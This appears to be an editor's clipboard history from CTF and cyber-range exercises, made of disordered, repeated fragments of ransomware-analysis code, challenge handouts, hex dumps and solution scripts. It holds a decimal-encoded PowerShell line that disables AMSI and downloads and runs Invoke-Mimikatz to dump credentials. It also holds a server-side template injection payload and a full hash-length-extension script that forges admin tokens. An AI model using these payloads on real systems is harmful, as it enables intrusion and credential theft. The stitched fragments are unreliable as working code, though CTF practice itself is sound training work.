e031d62a2045021606438321b028d524|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|13|13|V|python
	            while True:
d4613cd74518832d3be59e2b327d21e1|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|12|9|V|python
	        with open(filename, 'rb') as infile:
7b96cc794a48b7d69a0332908a804ca9|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|7|5|V|python
	    filesize = data.len()
761f65ca514e121775636d1ab993bd78|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|24|21|v|python
	base64.b64decode('MzUwZmRkODJkZjU3ZjM5MGI3YzE2Yzk1NzQ5MDBhM2UyODU2ZGM1OCAgZGVjcnlwdG9yLnB5Cg==').decode()
f3c017d1e1fa51b345d236b83b79ce97|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|24|1|V|python
	key = bytes.fromhex(base64.b64decode('MzUwZmRkODJkZjU3ZjM5MGI3YzE2Yzk1NzQ5MDBhM2UyODU2ZGM1OCAgZGVjcnlwdG9yLnB5Cg==').decode())
db57224f4490825f065c524991c21f1b|file:///home/neo/cyberranges/work/infect|6|1|V|python
	from Crypto.Hash import SHA256
b106666fd840107079f209f23a4366fe|file:///home/neo/cyberranges/work/infect|49|1|V|python
		hasher = SHA256.new(password.encode('utf-8'))
b19be5329db6099e6eb93d5bbfac48f6|file:///home/neo/cyberranges/work/infect|48|1|V|python
	def getkey(password):
		hasher = SHA256.new(password.encode('utf-8'))
		return hasher.digest()
2d742c610261ead20952dd27f8b987bd|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|6|30|v|python
	.encode('utf-8'
e6c55552029c8cabaebdec8eb81e9a59|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|22|1|V|python
	            dec += decryptor.decrypt(chunk)
	    except:
	        pass
1af21b135fa7aa6fa83edc3a56522a11|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|23|1|V|python
	    except:
	        pass
	    
8c058b90eafdfa88a6c6a317c6614e27|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|26|29|v|python
	'MzUwZmRkODJkZjU3ZjM5MGI3YzE2Yzk1NzQ5MDBhM2UyODU2ZGM1OCAgZGVjcnlwdG9yLnB5Cg=='
7dba6e2c4f5c6160a17c4593c1ace142|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|26|41|v|python
	.decode().strip().split(' ')[0]
5268ccf16fb5dd57f42532cb5fede939|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|27|1|V|python
	password = password.encode('utf-8')
aae1b1096120b1a41ee9dba5a5cb0058|file:///home/neo/cyberranges/work/r3dcryptor/decrypt.py|27|1|V|python
	# password = bytes.fromhex(password)
2177e7182c9eba82066e480ef5fef0a1|file:///home/neo/cyberranges/work/infect|179|12|v|python
	192.168.125.100:5000
35f18d0550cb3d80bdc2149f43078df0|file:///home/neo/cyberranges/work/infect|110|50|v|python
	/api/v1/resources/keys?ip=
eb35ac3c58215b0783ebee3b64b77597|file:///home/neo/cyberranges/work/tmp|1|1|V|
	91 78 101 116 46 83 101 114 118 105 99 101 80 111 105 110 116 77 97 110 97 103 101 114 93 58 58 83 101 114 118 101 114 67 101 114 116 105 102 105 99 97 116 101 86 97 108 105 100 97 116 105 111 110 67 97 108 108 98 97 99 107 32 61 32 123 36 116 114 117 101 125 10 116 114 121 123 10 91 82 101 102 93 46 65 115 115 101 109 98 108 121 46 71 101 116 84 121 112 101 40 39 83 121 115 39 43 39 116 101 109 46 77 97 110 39 43 39 97 103 101 109 101 110 116 46 65 117 116 39 43 39 111 109 97 116 105 111 110 46 65 109 39 43 39 115 105 85 116 39 43 39 105 108 115 39 41 46 71 101 116 70 105 101 108 100 40 39 97 109 39 43 39 115 105 73 110 105 39 43 39 116 70 97 105 108 101 100 39 44 32 39 78 111 110 80 39 43 39 117 98 108 105 99 44 83 116 97 39 43 39 116 105 99 39 41 46 83 101 116 86 97 108 117 101 40 36 110 117 108 108 44 32 36 116 114 117 101 41 10 125 99 97 116 99 104 123 125 10 73 69 88 32 40 78 101 119 45 79 98 106 101 99 116 32 83 121 115 116 101 109 46 78 101 116 46 87 101 98 99 108 105 101 110 116 41 46 68 111 119 110 108 111 97 100 83 116 114 105 110 103 40 34 104 116 116 112 58 47 47 49 57 50 46 49 54 56 46 49 50 53 46 49 48 48 47 73 110 118 111 107 101 45 77 105 109 105 107 97 116 122 46 112 115 49 34 41 59 73 110 118 111 107 101 45 77 105 109 105 107 97 116 122 32 45 68 117 109 112 67 114 101 100 115
5864917d1e6b77c78fd02fe7a26d93fe|file:///home/neo/cyberranges/work/tmp.py|6|17|v|python
	US\}tc-dG-P
8a6d69a70b9f965a00d873b703372767|file:///home/neo/cyberranges/work/tmp.py|6|16|v|python
	'US\}tc-dG-P'
a1177020616eb0267459bd39893e1a2b|file:///home/neo/cyberranges/work/tmp.py|6|1|V|python
	res = re.split(, s)
	print(res)
77c137e31f9abc920b060eb8134d2660|file:///home/neo/cyberranges/work/tmp.py|3|1|V|python
	s = '91U78G101t116G46}83U101U114c118P105G99}101-80}111c105P110}116t77S97d110S97c103S101U114c93G58U58-83-101S114c118}101}114S67}101S114-116}105t102}105P99d97d116U101c86-97U108G105P100-97t116G105c111-110G67G97-108-108G98G97P99P107P32t61}32-123G36G116P114S117S101}125G10t116c114-121G123U10-91c82c101d102-93c46c65-115d115P101P109t98U108}121S46U71G101-116P84c121-112-101}40S39G83}121-115}39-43-39G116-101d109d46d77P97}110P39S43-39-97c103}101c109-101d110-116G46G65t117t116P39P43U39-111c109t97-116t105P111-110-46d65-109U39-43G39P115d105U85t116t39-43-39U105S108-115U39U41-46d71-101S116d70U105P101S108}100U40t39t97c109P39d43-39c115d105d73-110d105G39S43-39d116-70P97}105S108}101U100}39}44}32d39}78t111S110S80-39d43S39U117c98-108S105G99U44U83}116t97t39d43U39}116c105P99}39-41G46t83d101}116c86S97U108}117t101-40t36t110-117}108U108S44U32G36-116-114-117S101-41-10t125P99}97}116t99c104}123U125t10d73S69U88c32U40S78S101U119d45c79S98-106c101P99P116-32-83-121P115G116U101d109-46S78U101G116P46G87S101G98-99c108P105-101d110U116t41t46t68P111G119-110-108P111-97}100c83G116}114S105d110c103c40U34G104P116d116G112G58S47-47d49-57d50-46-49-54c56}46}49}50t53c46}49d48-48t47P73U110-118}111}107S101-45S77c105P109P105}107}97c116c122-46-112d115c49-34t41t59S73}110G118S111d107-101P45P77U105P109c105-107-97d116G122S32t45-68-117d109c112}67-114t101P100G115'
b24c362065e23e69a3e7680a5841c0e9|file:///home/neo/cyberranges/work/tmp.py|3|1|V|python
	
	crs = 'US}tc-dG-P'
b62c8d2edfdc963c6b8c8099b104cb83|file:///home/neo/247ctf/networking/sol_zeroes.py|40|5|V|python
	    mic = data[-8:]
fa7553aa044e15a96020b468a82981d1|file:///home/neo/247ctf/networking/sol_zeroes.py|28|1|V|python
	    pn = b''.join([bytes([i]) for i in pn])[::-1]
09f49eb25bafb38311f8878f05078251|file:///home/neo/247ctf/networking/sol_zeroes.py|29|5|V|python
	    pn = b''.join([bytes([i]) for i in pn])
9d364abbef9ae927f8eabdc7fe9d23bc|file:///home/neo/247ctf/networking/sol_zeroes.py|42|5|V|python
	    mic = decr[-8:]
0cc2af4555e55bbe9799e873cd8eeae2|file:///home/neo/247ctf/networking/sol_zeroes.py|37|5|V|python
	    print(len(aad))
d6bdaed23628869801b77588b76b39f4|file:///home/neo/CTFs/csaw2020/babymult/instructions.txt|1|1|V|text
	554889e54883ec1848c745f84f00048b8154fe74b1000488945f048c745e8400048c745e0300048c745d81300048c745d01510048b8615b644bcf7700488945c848c745c0200048c745b81100048c745b0c1210048c745a8e965221848c745a03380048c74598aba0048c74590adaa8d0488b45f848faf45f048894588488b45e848faf45e048faf45d848faf45d048faf45c848894580488b45c048faf45b848faf45b048faf45a848898578ffffff488b45a048faf459848faf459048898570ffffffb80000c9
267be18295129ff12a9381b2aa63485c|untitled:1|8|1|V|
	rbp - 8
cc9067c2ee470dc248b14b194209a34e|untitled:1|1|1|V|
	
	
	
	
	
	
b713a0816b01493b6aec97beefabed5e|untitled:1|1|1|^v|
	rbp - 0x30 
c96f9dc58085808f84b3698483ea9f92|file:///home/neo/CTFs/csaw2020/slithery/decoded.py|27|1|V|python
	numpy = __builtins__.__dict__["__import__"]("numpy")\n""" + command
430560b7912037a6817c72df2c6515ea|file:///home/neo/CTFs/csaw2020/slithery/decoded.py|1|1|V|python
	#!/usr/bin/env python3
	from base64 import b64decode
	import blacklist  # you don't get to see this :p
	
	"""
	Don't worry, if you break out of this one, we have another one underneath so that you won't
	wreak any havoc!
	"""
	
	def main():
	    print("EduPy 3.8.2")
	    while True:
	        try:
	            command = input(">>> ")
	            if any([x in command for x in blacklist.BLACKLIST]):
	                raise Exception("not allowed!!")
	
	
	            final_cmd = """
	f = open("sandbox.py", "r")
	i = 1
	words = f.readlines()[i].strip().split(" ")
	word1 = words[i]
	word2 = words[-i]
	f.close()
	b64decode = getattr(__import__(word1), word2)
	numpy = __builtins__.__dict__["__import__"]("numpy")\n""" + command
f90267c662a7b859c303a7ac258e32a9|file:///home/neo/CTFs/csaw2020/slithery/sandbox.py|26|1|v|python
	RMbPOQHCzt
dd80748a76ca48c5296a1dbd6611bb8c|file:///home/neo/CTFs/csaw2020/slithery/decoded.py|27|1|^v|python
	numpy = __builtins__.__dict__["__import__"]("numpy")
bb5039bbd1ef53a63b4b2824eb5f4586|file:///home/neo/cyberranges/work/ocbc-cyberdrill/pirates_WEB/sol/sol.txt|2|1|V|text
	{{url_for.__globals__['os'].popen('cat flag.txt').read()}} [WORKS]
e992b452dac241b4616bc67af78aa93b|file:///home/neo/CTFs/csaw2020/authy/sol.py|12|5|V|python
	    print(hmac)
05dd444655ef6d10924d521152e98bd9|file:///home/neo/CTFs/csaw2020/authy/handout.py|69|1|V|python
	        infostr = ""
	        for pos, (key, val) in enumerate(info.items()):
	            infostr += "{}={}".format(key, val)
	            if pos != (len(info) - 1):
	                infostr += "&" infostr = infostr.encode()
e1fcc0ed419333ed3214cb4fca5ffec3|file:///home/neo/CTFs/csaw2020/authy/handout.py|77|1|V|python
	        hasher = hashlib.sha1()
	        hasher.update(SECRET + infostr)
673b03334a02678b1fce37163c26a7e4|file:///home/neo/CTFs/csaw2020/authy/sol.py|24|1|V|python
	    # for key_len in range(0,0xff):
178e36c6754105d1c48b6381e6b18fd9|file:///home/neo/CTFs/csaw2020/authy/sol.py|16|26|v|python
	 b''
5026bcd06534274afbc580e8768532f0|file:///home/neo/CTFs/csaw2020/authy/sol.py|12|5|V|python
	    print(identifier)
11f88ddd9aa47f00645247f6325f5522|file:///home/neo/CTFs/csaw2020/authy/sol.py|15|5|V|python
	    print(new_id)
dc01fa04ed108826fa728ef1046421b4|file:///home/neo/CTFs/csaw2020/authy/sol.py|14|5|V|python
	    new_id = identifier + append
f0f963e245035aa227ee2e931c971a7e|file:///home/neo/CTFs/csaw2020/authy/sol.py|14|5|V|python
	    new_b64 = base64.b64encode(new_id)
2036a8ddab8aefa076671cc26dde4256|file:///home/neo/CTFs/csaw2020/authy/sol.py|16|9|V|python
	        hashpumpy.hashpump()
a859a44c425c66d5b4c95f762206765e|file:///home/neo/CTFs/csaw2020/authy/sol.py|17|9|V|python
	        print(integrity, new_id)
7452bc667baea38a824e7ce1e1106349|file:///home/neo/CTFs/csaw2020/authy/sol.py|9|1|V|python
	    r = requests.post(URL + '/new', data = info)
caf9b6b99962bf5c2264824231d7a40c|file:///home/neo/CTFs/csaw2020/authy/sol.py|17|49|v|python
	info
3bdd4f3c9f92c6992ca64e51d101a3d2|file:///home/neo/CTFs/csaw2020/authy/handout.py|91|18|v|python
	base64.b64decode(info["id"]).decode()
2b302f40b029b42e4d00acbec0c83bc7|file:///home/neo/CTFs/csaw2020/authy/handout.py|91|1|V|python
	    identifier = base64.b64decode(info["id"]).decode()
d62d10bbbc7b7786050a1b432d328d08|file:///home/neo/CTFs/csaw2020/authy/sol.py|24|1|V|python
	    # infostr = ""
	    # for pos, (key, val) in enumerate(info.items()):
	    #     infostr += "{}={}".format(key, val)
	    #     if pos != (len(info) - 1):
	    #         infostr += "&"
	
	    # infostr = infostr.encode()
f65f0a4ecc9cad8bc412c75ab81cf11a|file:///home/neo/CTFs/csaw2020/authy/sol.py|24|5|V|python
	    # print(infostr)
525e087f88f50fca5eae9b6b543d1687|file:///home/neo/CTFs/csaw2020/authy/sol.py|21|1|V|python
	        r = requests.post(URL + '/view', data = payload)
db600b7ec2c2d39678f596633a47d3d8|file:///home/neo/CTFs/csaw2020/authy/sol.py|4|1|V|python
	from subprocess import check_output
f84122b18cc8850881ad85a24ebb502f|file:///home/neo/CTFs/csaw2020/authy/sol.py|18|5|V|python
	    # payload = {'id': base64.b64encode(identifier), 'integrity':hmac}
	    # r = requests.post(URL + '/view', data = payload)
	    # print(r.text)
7b4665dfab433032989ad36f933dfd49|file:///home/neo/CTFs/csaw2020/authy/sol.py|21|5|V|python
	        # print(new_b64)
	        # print(integrity)
5d0032fc1d68ed2d032d10896c468117|file:///home/neo/CTFs/csaw2020/authy/sol.py|17|5|V|python
	    print(append)
c824895aacb101b52d3006a315820536|file:///home/neo/CTFs/csaw2020/authy/sol.py|1|1|V|python
	import requests
	import hashpumpy
	import base64
	# from subprocess import check_output
	
	URL = 'http://crypto.chal.csaw.io:5003'
	
	if __name__=='__main__':
	    info = {'author': 'neo', 'note': 'test'}
	    r = requests.post(URL + '/new', data = info)
	    resp = r.text.strip().split(' ')[-1].split(':')
	    identifier = base64.b64decode(resp[0])
	    hmac = resp[1]
	    append =  b'&entrynum=7&admin=True&access_sensitive=True'
	    for key_len in range(0,0xff):
	        integrity, new_id = hashpumpy.hashpump(hmac, identifier, append, key_len)
	        new_b64 = base64.b64encode(new_id)
	        payload = {'id': new_b64, 'integrity': integrity}
	        r = requests.post(URL + '/view', data = payload)
	        print(r.text)
975c5d94be63040ea5fd1b4760e8e275|file:///home/neo/CTFs/csaw2020/authy/sol.py|18|21|v|python
	.replace('\\','\\\\'))
b98dc7528afe7184f5c5abeab4c225e0|file:///home/neo/CTFs/csaw2020/authy/handout.py|97|67|v|python
	.encode('ISO-8859-1')
2116f4bd8ad0240ccdf28363c5804b93|file:///home/neo/CTFs/csaw2020/ezbreezy/section|1|1|V|
	
	app:     file format elf64-x86-64
	
	Contents of section .aj1ishudgqis:
f3b06132a15f1ad1aa1ff3625018a0a8|file:///home/neo/CTFs/csaw2020/ezbreezy/section|1|1|v|
	8001a0 
5cc86d6360aed5bb04bc38ee230f57f9|file:///home/neo/CTFs/csaw2020/ezbreezy/section|1|38|v|
	UH...E.6....}.Z?
307c8bdb098233dde017189f7991ca40|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8001b0 
e8f8fb28c68f9ac9fb342e2acc5011b2|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..u............E
29e7fb5bbc58be396544a78a37a7fb8f|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8001c0 
326f8079f97ea6afe87597effbfd58ed|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...E..<...}..@..
7884382c9ce67f389d5270d77f784888|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	u............E..
a97df67024580267d3f90a5a0e143125|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8001d0 
4f03df0d9f3af323440efbbb2cd0d3f4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8001e0 
c0700ce3842a7938616e43ab2f1c8e15|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800200 
e824b271eccc46b4a6487a83c29e3519|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8001f0 
1f9529dba8da1d54ddfb811038f05462|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...........E...E
c73c170991a1eb20551a7bff77665115|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.|....}.(...u...
026f694761b7193deb974f11a223e5a6|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800210 
9f5ee3d667dce449f37d83335dd243b4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.........E...E..
739e3dbbf8741569f50438338eb66306|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800220 
a5cf46c6e47d76f7a85f43d6a8e6779e|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	....}.pP..u.....
28ed99db139808659c469bb2f2f6d93f|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800230 
437b87c013070954b3318b7be1c0e56b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..l....E...E....
9c50ed461aa580fa47c20e577a832be3|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E..~...}.G...u.
c8474b4d555aec22d8d26e8d037d5a25|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800240 
da290a654658020737ab94fb28b65703|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..}.....u.......
04014334228f2088c8935111c664f990|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	N....E...E..F...
28fe4953175291b75b6054cf355a0e6e|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800270 
9e76ada3ef9f3e4acae10fbe9db078ba|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..'.u...........
772144d08bd5b2889b041a04fc8588a5|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800260 
3aacf8c926cd28358f9103c53b378a78|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E...E......}.c.
3274e4dcef55a93b2736e908864b1c95|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800290 
e8f8fb28c68f9ac9fb342e2acc5011b2|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..u............E
f8129246eb349c55ab4d1ca3031d6556|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002a0 
f22e8e1db2c1cb4ea007e5169d8c9e83|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.\.E......}.+/..
c4c431d484aa414b64c25dc5b8f0fd15|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002c0 
47e9117b278da80008a04105508ca0e6|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800250 
33b3b8213ff91ebfa51fda7fe60d5c7b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800280 
5bf5ca14d181e128d64485b4bdb204e7|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002d0 
14fd7fd0257014216e3b65bf683ad1c4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002b0 
7e4134ebf8a9b75caf2632e50f1a7fa8|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002e0 
cf766f7f4feb2925be5843303398d994|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E......}.....u.
0eac1645165e391c74c590e3cfa0b89e|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	}.....u.......0.
005b10e2691128930e031771d0bfd351|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8002f0 
9f5ee3d667dce449f37d83335dd243b4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.........E...E..
d0897b2819b9853932a3813ea8a9fc80|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800310 
b04ca8f1f2cf2048208e731c46303f44|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800300 
194c037495eab6889890a30200a39819|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800320 
8ced961c8a9ebf781c64e5167c1f1ce5|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..|....E...E.:..
8eb25befdc7d03087c5417271ab1ffac|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..Z...}..E..u...
2b8a97cc26910a6f13c2ef18f4b9a5f8|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...E...E......}.
d58fa54a0fa577928dbf3aa31ce733d8|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	....}.....u.....
b10642cfc1e9c51cefa812796bc96dca|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..}.J...u.......
2bd5c1a57f414e9a4de060e7251197d4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800340 
53a4b3a5c36a4c1c0c136e75f96b815b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	}.....u.......@.
92a5ea2ab230ed2d011ce424c8ed03a9|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	^....E.[.E.3....
8917bfb303d2240763e7c579754b90ac|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800360 
2b8a97cc26910a6f13c2ef18f4b9a5f8|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...E...E......}.
8b6ff5c533da04de976d04a294efd9ff|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800350 
45ff1eb2fce300bfeaeb56dee157c395|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800370 
6f9ecb9f69005a243da4a1831b3d0648|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	....u......."...
ae0e918232bc1958ecfff0abbf1872ed|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800380 
1c087affe15671ab87c3287a16789c6b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E.X.E..R...}...
e8f8fb28c68f9ac9fb342e2acc5011b2|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..u............E
14f82f40e9694ff68d910610a319948e|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...E..1...}.([..
1d881fe445f2e4efe4ccce4377e17fec|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003a0 
6fc685981ce8068e458d09aff9821fa4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003b0 
7884382c9ce67f389d5270d77f784888|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	u............E..
f3b273a61cf079de58dd38ce3358f211|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800390 
f1924f759f6b51310e7408e20d433e9d|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800330 
477ce61fd03d7ac297843807e9f2318c|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...........E.[.E
209d23ba03151b3c89ab429eb72e9d87|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	u............E.[
1f9529dba8da1d54ddfb811038f05462|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...........E...E
2859e701cdff85828ca9234335bb93c9|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	......}... .u...
1dd0a7b39a6bcc553aee4071ee1744b5|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003d0 
4f832708d86a005fa34d259736f018f1|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003e0 
ab49ac88cd3682e1e12cedd3f4da9515|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003f0 
495769ae92ebe7ecada3866b27176fea|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8003c0 
e9d021fa5b01033ac5cb6fbfcb2e580a|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.........E.[.E.]
a00bca1fe4f65d3ac0e851afe863486c|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800400 
2bf16047de65fe6b01fc51a4c77f3b0c|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.......E...E....
efb2f012aa84969877a3ce3853f8b440|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	....}.R...u.....
9185189ec227ce9138fd58fcf16b1c5b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800420 
5d4d9848800b493cebb917ea27350603|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	..}..=..u.......
01b4ae154af5bba582afa8ff6b11618c|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	q.E...E.b....}.`
1a07e7ce9f698865985687a305d48766|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800440 
3cc122c863b9fe322faeb43ee7162964|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800450 
6f8324572a010763c52ba597de624e3b|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...u.......V.E..
1c50e6c9212581d7299e0a847980fab4|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E..<...}.."..u.
0ae042a8cca839b75bceb67f15ececbd|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800470 
a6037c3199df10d43c59a8cefb73f038|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	......;.E.[.E...
88985b9ee95ff08f8f9efdfb70f0cb1d|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	...}.E...u......
40824f9a4c80280b37c21054924c4031|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800430 
880673524f2666996f6ec46bc02b75d1|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800480 
2eee4f6580e4a4dbfa6bb544f8fa6189|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	. .E...E......}.
619b05a0b17ac92a4444adfc17b89d77|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.y$.u...........
bada6976319ef11516d8649a7d6e27ad|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	8004a0 
3eeeeee4e07d71278113a53fabee3fc9|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	.E.K....}.66..u.
0a5e75de76730789cfc68d925335e2fd|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800490 
48a3f1e4d8091d24857c1c2fc728d4bc|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800460 
4b2114e095d630e0593daa7f1fbda6d3|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|1|v|
	800410 
c02c6f091f26b5da51ac10aca8b4fded|file:///home/neo/CTFs/csaw2020/ezbreezy/section|49|9|v|
	                             ..].            
842ce11e18660c4cc35c065e40928897|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|1|1|v|asm
	   0:   
c32b28db341fd95fce00c88d2cee4ced|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|1|4|v|asm
	0:   55                      
19d5d89a51e7d8025064d7a5a21808e9|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	2:   89 e5                   mov    
57bed1f324144101f5fa0da726199ed9|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	4:   c7 45 fc 36 14 03 00    mov    DWORD PTR 
891f166dedb4f2b8c81147ed82d53c0d|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	b:   81 7d fc 5a 3f 00 00    cmp    DWORD PTR 
752ac0a91bda09c6bec7df653f245635|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	14:   b8 01 00 00 00          mov    
839107284672eb37081d20528a883b5c|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	12:   75 0a                   
979190e4d8fea6e8a8444ff2a730060c|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	19:   e9 e4 02 00 00          
d11141a066cc7bd8b88701711702330b|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	22:   c7 45 fc a3 3c 09 00    mov    DWORD PTR 
6b5a819bcd8fdbfa0f2db9cbb3bff0bc|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	30:   75 0a                   
a2b5d48205c4864b41e0138dde67ab42|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	29:   81 7d fc ec 40 1f 00    cmp    DWORD PTR 
f85d10f1a31b8897307e9c8a18ad1138|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	32:   b8 01 00 00 00          mov    
e327219d3f040336a3cb4a7a11b8aa23|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	37:   e9 c6 02 00 00          
4eb8fc4f871787142963b35bf7315fbb|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	40:   c7 45 fc c9 7e 13 00    mov    DWORD PTR 
63333170000d33e981815854fa4829c2|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	47:   81 7d fc 47 fc 03 00    cmp    DWORD PTR 
585b34bcf057b8925a8d681280c24ac8|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
	4e:   75 0a                   
c34f71cc10e34a8c8c572c51f5f844c2|file:///home/neo/CTFs/csaw2020/ezbreezy/code.asm|161|2|v|asm
